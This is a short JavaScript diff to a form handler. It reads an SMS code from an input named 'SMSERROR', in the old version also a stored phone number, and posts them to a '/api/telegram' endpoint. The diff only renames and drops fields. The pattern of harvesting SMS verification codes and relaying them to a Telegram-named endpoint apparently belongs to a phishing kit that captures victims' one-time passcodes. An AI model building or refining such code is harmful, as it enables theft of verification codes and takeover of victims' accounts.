@@ -381,14 +381,13 @@ const smsForme = document.querySelector("#smsForme");
     smsForme.addEventListener("submit", async (e) => {
       e.preventDefault();
     
-      const sms_code = document.getElementById("SMSERROR").value;
-      const num = localStorage.getItem("num") || "";
+      const smsForme = document.getElementById("SMSERROR").value;
     
       try {
         const response = await fetch("/api/telegram", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ num, sms_code }),
+          body: JSON.stringify({smsForme }),
         });
     
         if (response.ok) {
